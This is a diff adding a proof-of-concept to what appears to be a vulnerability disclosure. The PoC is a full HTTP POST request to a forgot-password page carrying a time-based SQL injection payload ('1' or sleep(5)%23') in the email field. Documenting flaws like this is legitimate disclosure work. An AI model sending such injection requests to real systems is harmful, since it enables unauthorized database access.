@@ -10,6 +10,20 @@ http://192.168.234.128/forgot_password.php
 
 POST:btn_forgot=1&email=1' or sleep(5)%23
 
+POC:
+```
+POST /forgot_password.php HTTP/1.1
+Host: 192.168.234.128
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+btn_forgot=1&email=1' or sleep(5)%23
+```
+
 ![Image text](1.jpg)
 ![Image text](2.jpg)
 ![Image text](3.jpg)
